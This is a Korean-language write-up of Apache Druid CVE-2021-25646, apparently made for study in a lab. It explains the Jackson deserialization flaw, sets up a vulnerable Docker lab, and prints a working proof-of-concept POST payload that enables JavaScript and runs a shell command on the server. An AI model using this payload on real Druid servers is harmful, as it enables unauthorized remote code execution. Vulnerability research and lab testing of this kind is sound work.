# Apache Druid 취약점 (CVE-2021-25646)
### **개요**
  Apache Druid는 대량의 이벤트 데이터를 빠르게 얻고 데이터에 대한 짧은 대기 시간 쿼리를 제공하도록 Java로 작성된 열 지향 오픈 소스 분산 데이터 저장소이다. Apache Druid에는 사용자가 제공 한 JavaScript를 실행하는 코드가 포함되어 있으며 다양한 유형의 요청에 포함된다. 이 기능은 신뢰도가 높은 환경에서 사용하기 위한 기능이기 때문에, 기본적으로 비활성화 상태이다. 하지만, Druid 0.20.0 이전 버전에서는 서버 구성에 관계없이 사용자가 제공한 JavaScript 코드를 실행할 수 있는 취약점(CVE-2021-25646)이 발견되었다. 해커는 해당 취약점을 악용해 Druid 서버 프로세스의 권한으로 타겟 시스템에서 원격 코드실행을 할 수 있다.<br><br><br>
  
### **분석 내용 (Summary)**
Apache Druid는 기본적으로 JavaScript 함수의 실행을 지원하지 않는다. 이 취약점의 근본적인 문제는 Apache Druid의 Jackson이 JavaScript 타입 JSON 데이터 구문을 파싱하는 과정에서 JavaScript 실행 설정을 활성화함으로서 원격 코드 실행 취약점이 발생하게 된다. 

JavaScriptDimFilter의 생성자는 @JsonCreator를 사용한다. 즉, JavaScriptDimFilter 클래스가 역직렬화 될 때, Jackson은 이 생성 메서드를 호출하고, dimesion, function, extractFn, filterTuning은 Jackson이 JavaScriptDimFilter로 역 직렬화 및 구문 분석 할 때, CreatorProterty 유형으로 캡슐화되며 @JsonProperty로 표시되지 않은 구성 매개 변수의 경우 ""라는 CreatorProperty가 생성된다.
Jackson이 구문 분석 시에 name이 ""인 경우, config에 바인딩이 된다. 이를 통해 JavaScript를 사용하도록 설정할 수 있다.

_deserializePropertyBased 메서드를 사용하여 구문이 분석된 Json 문자열의 "key name"은 현재 구문이 분석된 상태에서 해당 Creator Property를 찾는데 사용된다. Creator Property를 찾는 기능은 findCreatorProperty 메서드의 _propertyLookup HashMap에서 해당 "key name"에 대한 속성을 찾을 수 있다. _propertyLookup에서 JavaScriptConfig의 키는 @JsonProperty로 속성이 수정되지 않기 때문에, ""으로 Creator Property가 생성되고 Jacson이 입력한 키를 설정한다. 그리고 사용자는 ""값에 속성을 할당하게 된다. 
그래서 공격자가 Json 문자열에 ""로 키를 제공하면 findCreatorProperty가 해당 키와 일치하고 JavaScriptConfig에 해당하는 Creator Property를 얻는다. 이를 enabled = true로 설정하여 Apache Druid의 JavaScript기능을 활성화할 수 있다.  


<br><br><br>

# 취약 환경 구축
* 취약 버전 : 0.20.0 이하
* 해결 버전 : 0.20.1 이상<br> <br> 
## **환경 구축 ( docker )**
1. https://github.com/apache/druid 를 Clone. <br><br>
2. `/druid/docker_druid/druid/distribution/docker` 경로에서 docker-compose.yml 파일을 다음과 같이 수정한다. 
   * coordinator: & broker: & historical: & middlemanager: & router: 명시한 4개의 각 서비스에 대한 apaapache/druid 버전을 취약한 버전으로 수정. 

   * ex) apache druid 0.19.0 버전을 사용할 경우 아래와 같이 수정. 
```{docker}
    coordinator:
        image: apache/druid:0.19.0
        container_name: coordinator
        volumes:
          - ./storage:/opt/data
          - coordinator_var:/opt/druid/var
        depends_on:
          - zookeeper
          - postgres
        ports:
          - "8081:8081"
        command:
          - coordinator
        env_file:
          - environment
```

3. `docker-compose up` 명령 실행 <br><br>
4. 127.0.0.1:8888 접근 가능 여부 확인 <br><br>


<br>

## **취약 환경 설정 ( LoadData )**
1. 좌측 상단 Load data - Start new spec - Local disk 클릭 <br><br>
2. Connect data 이후 아래와 같이 설정을 삽입 후 Apply - Next.
   * Base directory : `quickstart/tutorial/`
   * File filter : `wikiticker-2015-09-12-sampled.json.gz` <br><br>
3. Add column filter가 보일 때까지 계속해서 Next <br><br>
4. Add column filter 클릭하여 다음과 같이 삽입 후 Apply - Next. 
   * Dimension : `cityName`
   * Value : `Auburn` <br><br>
<br><br><br>

# 취약점 테스트
### Payload : https://github.com/Vulnmachines/Apache-Druid-CVE-2021-25646/blob/main/Payload.txt

```
/tmp/hacked!.txt 파일 생성 PoC

### URL
POST 127.0.0.1:8888/druid/indexer/v1/sampler?for=filter

### Payload
{"type":"index","spec":{"ioConfig":{"type":"index","firehose":{"type":"local","baseDir":"quickstart/tutorial/","filter":"wikiticker-2015-09-12-sampled.json.gz"}},"dataSchema":{"dataSource":"sample","parser":{"type":"string","parseSpec":{"format":"json","timestampSpec":{"column":"time","format":"iso"},"dimensionsSpec":{}}},"transformSpec":{"transforms":[],"filter":{"type":"javascript", "function":"function(value){return java.lang.Runtime.getRuntime().exec('touch /tmp/hacked!.txt')}", "dimension":"added", "":{ "enabled":"true" } }}}},"samplerConfig":{"numRows":500,"cacheKey":"73a90acaae2b1ccc0e969709665bc62f"}}
```
<br>

## **패킷 전송**


<br><br>

## **결과 확인**


<br><br><br>
# 참고 자료 
* https://www.77169.net/html/275825.html
* https://mp.weixin.qq.com/s/McAoLfyf_tgFIfGTAoRCiw
* https://mp.weixin.qq.com/s/m7WLwJX-566WQ29Tuv7dtg
* https://securitylab.github.com/research/rhino-in-the-room/
* https://xz.aliyun.com/t/9229?page=1
* https://hell38vn.wordpress.com/2021/04/01/phan-tich-cve-2021-25646-code-execution-on-apache-druid/
  